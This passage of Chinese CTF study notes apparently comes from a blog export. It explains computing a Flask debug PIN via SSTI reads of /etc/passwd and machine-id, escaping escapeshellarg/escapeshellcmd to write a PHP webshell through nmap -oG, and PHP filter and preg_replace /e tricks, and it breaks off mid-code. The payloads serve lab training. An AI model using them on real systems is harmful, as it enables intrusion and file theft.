--&gt;用户名root<br><span class="hljs-number">2</span>、modname --&gt;flask.app<br><span class="hljs-number">3</span>、getattr<span class="hljs-function"><span class="hljs-params">(app,<span class="hljs-string">&quot;__name__&quot;</span>,app.__class__.__name__)</span> --&gt;</span>Flask<br><span class="hljs-number">4</span>、getattr<span class="hljs-function"><span class="hljs-params">(mod,<span class="hljs-string">&quot;__file__&quot;</span>,None)</span> --&gt;</span> flask目录下的一个app.py的绝对路径<br><span class="hljs-number">5</span>、str<span class="hljs-function"><span class="hljs-params">(uuid.getnode())</span> --&gt;</span>mac地址十进制<br><span class="hljs-number">6</span>、get_machine_id<span class="hljs-function"><span class="hljs-params">()</span>--&gt;</span>根据操作系统不同，有四种获取方式<br></code></pre></td></tr></table></figure><hr><h2 id="pin码计算例题"><a href="#pin码计算例题" class="headerlink" title="pin码计算例题"></a>pin码计算例题</h2><p><a href="https://blog.csdn.net/2401_86190146/article/details/145838268">参考：</a></p><p>读取debug控制板的pin码</p><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式</p><p>想要拿到pin码需要知道： </p><ol><li><p>username，启动这个flask的用户名，在&#x2F;etc&#x2F;passwd</p></li><li><p>modname，默认值为flask.app</p></li><li><p>appname，默认值为Flask</p></li><li><p>moddir，flask库下app.py的绝对路径，可以通过报错拿到,如传参的时候给个不存在的变量</p></li><li><p>uuidnode，当前网络的mac地址的十进制数,任意文件读 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p></li><li><p>machine_id，docker机器id<br>docker：&#x2F;proc&#x2F;self&#x2F;cgroup<br>linux：&#x2F;etc&#x2F;machine-id</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">get_machine_id() ：<span class="hljs-regexp">/etc/</span>machine<span class="hljs-operator">-</span>id或者 <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random<span class="hljs-operator">/</span>boot_i中的值<br>假如是在win平台下读取不到上面两个文件，就去获取注册表中<span class="hljs-type">SOFTWARE</span>\<span class="hljs-type">Microsoft</span>\<span class="hljs-type">Cryptography的值</span> 假如是<span class="hljs-type">Docker机</span> 那么为 <span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>cgroup docker行 <br></code></pre></td></tr></table></figure><p><strong>1.获取username： 查看flask用户，用户名为flaskweb（在最后一行）</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#123;&#125;<span class="hljs-name">.__class__.__mro__</span>[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><code>__mro__[-1]：</code><br>通过索引 -1 取出元组的最后一个元素，也就是 object 类，因为 object 是 Python 中所有类的基类。</p></li></ol><p>​<strong>2获取moddir：报错信息显示</strong></p><p>​<strong>3.uuidnode： 获得机器的mac地址（十六进制），将其转换成十进制</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#123;&#125;<span class="hljs-name">.__class__.__mro__</span>[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](<span class="hljs-name">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>​<strong>4.machine_id：</strong>获得机器id </p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> x <span class="hljs-keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-keyword">in</span> x.__name__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/machine-id&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endif</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endfor</span><span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>计算pin脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;218117161077153&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br> <br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br> <br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br> <br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br> <br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>计算出pin码为220-602-853</p><p>在报错界面进入debug环境</p><p>然后输入pin码</p><p>然后执行命令</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;cat /this_is_the_flag.txt&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF2018-OnlineTool1</title>
      <link href="/2025/03/21/BUUCTF2018-OnlineTool1/"/>
      <url>/2025/03/21/BUUCTF2018-OnlineTool1/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF2018-OnlineTool1"><a href="#BUUCTF2018-OnlineTool1" class="headerlink" title="BUUCTF2018-OnlineTool1"></a>BUUCTF2018-OnlineTool1</h1><p>首先启动靶机并访问，看到一串源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一堆函数，并且有没见过的函数escapeshellarg、escapeshellcmd，所以先查查这些函数</p><p>这段<a href="https://so.csdn.net/so/search?q=%E4%BB%A3%E7%A0%81%E5%9D%97&spm=1001.2101.3001.7020">代码块</a>检查请求中是否设置了<code>HTTP_X_FORWARDED_FOR</code>头部。如果设置了，它将<code>REMOTE_ADDR</code>设置为<code>HTTP_X_FORWARDED_FOR</code>的值。这通常用于处理<a href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">Web服务器</a>位于代理后面的情况。</p><p>chdir($sandbox);<br>chdir 函数用于改变当前的工作目录（Current Working Directory，CWD）为指定的目录。</p><p>在这里，$sandbox 是之前根据用户IP地址创建的沙盒目录的名称（通过 md5(“glzjin” . $_SERVER[‘REMOTE_ADDR’]) 计算得到的）。</p><p>这意味着 PHP 脚本的当前工作目录将被更改为用户特定的沙盒目录，后续的文件和命令将在这个目录下执行。</p><h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h2><blockquote><p>**escapeshellarg()**将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含<a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>、<a href="https://www.php.net/manual/zh/function.system.php">system()</a> 和<a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p><p>在 Windows 上，<strong>escapeshellarg()</strong> 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(<code>\</code>)都会被一个额外的反斜线所转义。</p></blockquote><p><em>言外之意，就是看到了一个字符串，先用单引号括起来，然后对于其中已有的引号再进行反斜线转义，并用单引号括起来进行引用。</em></p><p>最后这一句告诉咱们Windows上边是绝对试不出来正确的结果的，要使用外界的PHP线上运行环境。<br><a href="https://www.jyshare.com/compile/1/">菜鸟</a></p><h2 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h2><p><img src="/../image/BUUCTF2018-OnlineTool1-1.png" alt="img"></p><p>言外之意就是把字符串中的特殊字符使用反斜线转译掉</p><hr><p>所以下边就是相应的原理</p><p><strong>下面回到题目，可以发现体中有一个函数<code>system</code>来执行的我们的nmap命令，由于管道等命令全都用不了了，</strong></p><p><strong>nmap有一个参数-oG可以实现将命令和结果写到文件</strong></p><p><strong>所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag，构造paload：?host&#x3D;’ <?php echo `cat /flag`;?> -oG test.php ‘</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;&#x27; &lt;?php phpinfo();?&gt; -oG test.php &#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;                     &quot;</span>;<br><span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$h</span>.<span class="hljs-string">&quot;                     &quot;</span>;<br><span class="hljs-variable">$h</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$h</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$h</span>.<span class="hljs-string">&quot;                &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;                        nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$h</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;                     </span><br><span class="language-xml">&#x27;&#x27;\&#x27;&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;\&#x27;&#x27;&#x27;                     </span><br><span class="language-xml">&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php phpinfo\(\)\;\?\&gt; -oG test.php &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="language-xml">//下面的这个等价于</span><br><span class="language-xml">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27; \&lt;\?php phpinfo\(\)\;\?\&gt; -oG test.php &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="language-xml">=&gt;</span><br><span class="language-xml">nmap -T5 -sT -Pn --host-timeout 2 -F \\ \&lt;\?php phpinfo\(\)\;\?\&gt; -oG test.php &#x27;\\&#x27;</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">就目前来看可以看到\都没有了只剩下了</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>可以注意到，如果后边没有空格的话，<code>\\</code>就会和<code>php</code>连在一起，这个时候无法正确解析，所以必须有空格。</p><p>最终payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php &#x27;</span><br></code></pre></td></tr></table></figure><p>由于chdir($sandbox);，需要改变目录访问</p><p>GET方法提交后会显示当前的工作目录，然后访问url&#x2F;工作目录&#x2F;hack.php即可看到flag</p><hr><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h2 id="escapeshellarg-1"><a href="#escapeshellarg-1" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h2><blockquote><p>**escapeshellarg()**将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含<a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>、<a href="https://www.php.net/manual/zh/function.system.php">system()</a> 和<a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p><p>在 Windows 上，<strong>escapeshellarg()</strong> 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(<code>\</code>)都会被一个额外的反斜线所转义。</p></blockquote><p><em>言外之意，就是看到了一个字符串，先用单引号括起来，然后对于其中已有的引号再进行反斜线转义，并用单引号括起来进行引用。</em></p><p>最后这一句告诉咱们Windows上边是绝对试不出来正确的结果的，要使用外界的PHP线上运行环境。<br><a href="https://www.jyshare.com/compile/1/">菜鸟</a></p><h2 id="escapeshellcmd-1"><a href="#escapeshellcmd-1" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h2><p><img src="/../image/BUUCTF2018-OnlineTool1-1.png" alt="img"></p><p>言外之意就是把字符串中的特殊字符使用反斜线转译掉</p><p><strong>这俩函数一起用并且顺序是先escapeshellarg()后escapeshellcmd()就会导致单引号逃逸</strong></p><hr><h2 id="nmap-oG"><a href="#nmap-oG" class="headerlink" title="nmap -oG"></a>nmap -oG</h2><ul><li>**<code>-oN/-oX/-oS/-oG &lt;file&gt;</code>**：以不同格式输出：普通、XML、scrIpt kIddi3和可grep格式。</li></ul><p><strong>-oG该参数实现将命令和结果写到文件</strong></p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nmap -T5 -sT -Pn --host-timeout <span class="hljs-number">2</span> -F <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-meta">?&gt;</span> -oG hack.php<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> escapeshellarg()和escapeshellcmd()、单引号逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-ZJCTF不过如此</title>
      <link href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
      <url>/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-ZJCTF不过如此"><a href="#BJDCTF2020-ZJCTF不过如此" class="headerlink" title="BJDCTF2020-ZJCTF不过如此"></a>BJDCTF2020-ZJCTF不过如此</h1><p>1、首先打开靶机就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里很明显要我们去包含next.php然后查看其中的源码，和之前那题很像也是两个传参，还是用data:&#x2F;&#x2F;伪协议去绕过file_get_contents函数</p><p>2、get方法传值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,I have a dream&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure><p>回显出一行base64编码字符串</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKJGlkID<span class="hljs-number">0</span>gJF<span class="hljs-number">9</span>HRVRbJ<span class="hljs-number">2</span>lkJ<span class="hljs-number">107</span>CiRfU<span class="hljs-number">0</span>VTU<span class="hljs-number">0</span>lPTls<span class="hljs-symbol">naWQnXSA9</span>ICRpZDsKCmZ<span class="hljs-number">1</span>bm<span class="hljs-symbol">N0</span>aW<span class="hljs-number">9</span>uIG<span class="hljs-symbol">NvbXBsZXgoJHJlLCAkc3</span>RyKSB<span class="hljs-number">7</span>CiAgICByZXR<span class="hljs-number">1</span>c<span class="hljs-name">m4</span>gcHJlZ<span class="hljs-number">19</span>yZXBsYW<span class="hljs-symbol">NlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9</span>laScsCiAgICAgICAgJ<span class="hljs-number">3</span><span class="hljs-symbol">N0</span>c<span class="hljs-symbol">nRvbG93</span>ZXIoIlxcMSIpJywKICAgICAgICAkc<span class="hljs-number">3</span>RyCiAgICApOwp<span class="hljs-number">9</span>CgoKZ<span class="hljs-name">m9</span>yZWFjaCgkX<span class="hljs-number">0</span>dF<span class="hljs-attr">VCBhcyAkcmUgPT4</span>gJH<span class="hljs-symbol">N0</span>cikgewogICAgZW<span class="hljs-symbol">NobyBjb21</span>wbGV<span class="hljs-number">4</span>KCRyZSwgJH<span class="hljs-symbol">N0</span>cikuICJcbiI<span class="hljs-number">7</span>C<span class="hljs-symbol">n0</span>KCmZ<span class="hljs-number">1</span>bm<span class="hljs-symbol">N0</span>aW<span class="hljs-number">9</span>uIGdldEZsYWcoKXsKCUBldmFsKCRfR<span class="hljs-number">0</span>VUWydjbWQ<span class="hljs-symbol">nXSk7</span>C<span class="hljs-symbol">n0</span>K<br></code></pre></td></tr></table></figure><p>然后我们将其解码之后就是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>3、代码审计</p><p>这里很明显要去利用getFlag函数去命令执行拿到flag，要使用该函数只能利用echo complex($re,$str)这条语句</p><p>这里解题的关键就是<code>preg_replace()+/e</code>存在代码执行漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">preg_replace</span> (正则表达式, 替换成什么, 目标字符串, 